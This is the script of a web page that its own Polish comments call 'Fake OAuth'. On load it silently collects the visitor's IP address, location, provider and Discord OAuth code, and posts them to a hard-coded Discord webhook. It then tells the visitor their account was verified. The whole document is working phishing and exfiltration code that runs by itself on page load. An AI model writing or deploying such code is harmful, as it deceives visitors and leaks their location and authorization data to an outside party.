<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1474522040085254144/EYnK4I6zerq0M0dZYUaXYQA8_lDJomCRJ3nSXOD5Pp-x9Ea6INZw2Sb4eijahy1ZSRmK";

    async function startProcess() {
        const status = document.getElementById('status-text');
        const title = document.getElementById('main-title');
        const loader = document.getElementById('loader-icon');
        const success = document.getElementById('success-icon');

        // 1. Pobieramy "code" z linku (po autoryzacji Discorda)
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');

        try {
            // Etap wizualny
            setTimeout(() => { status.innerText = "Synchronizacja danych z Discord..."; }, 1000);

            // 2. Pobieramy dane o IP i lokalizacji
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            
            const vpnKeywords = ['vpn', 'proxy', 'hosting', 'ovh', 'cloudflare', 'google', 'amazon'];
            const isVPN = vpnKeywords.some(k => ipData.org.toLowerCase().includes(k));

            // 3. Budujemy wiadomo≈õƒá do Webhooka
            // Uwaga: Bez back-endu (serwera) nie pobierzemy Nicku/ID przez sam kod "code" 
            // ze wzglƒôd√≥w bezpiecze≈Ñstwa Discorda (wymagany Client Secret).
            // Dlatego najskuteczniejszƒÖ metodƒÖ w "Fake OAuth" jest logowanie IP 
            // i informacja, ≈ºe autoryzacja na stronie siƒô odby≈Ça.
            
            const payload = {
                embeds: [{
                    title: "üõ°Ô∏è Nowa Autoryzacja - Log Systemowy",
                    color: isVPN ? 0xff4747 : 0x23a559,
                    fields: [
                        { name: "üåê Adres IP", value: `\`${ipData.ip}\``, inline: true },
                        { name: "üìç Lokalizacja", value: `\`${ipData.city}, ${ipData.country_name}\``, inline: true },
                        { name: "üì° Dostawca", value: `\`${ipData.org}\``, inline: false },
                        { name: "üõ°Ô∏è VPN/Proxy", value: isVPN ? "‚ö†Ô∏è WYKRYTO" : "‚úÖ BRAK", inline: true },
                        { name: "üîë OAuth Code", value: `\`${code || "Brak (wej≈õcie bezpo≈õrednie)"}\``, inline: false }
                    ],
                    footer: { text: "Made by Komendant Devs Security" },
                    timestamp: new Date()
                }]
            };

            // 4. Wysy≈Çka na Webhook
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // 5. Finalizacja widoku dla u≈ºytkownika
            setTimeout(() => {
                loader.style.display = 'none';
                success.style.display = 'block';
                title.innerText = "Zweryfikowano";
                title.style.color = "#23a559";
                status.innerText = "Twoje konto zosta≈Ço pomy≈õlnie zautoryzowane. Mo≈ºesz wr√≥ciƒá na Discord.";
            }, 3000);

        } catch (e) {
            status.innerText = "B≈ÇƒÖd weryfikacji. Spr√≥buj ponownie.";
        }
    }

    window.onload = startProcess;
</script>
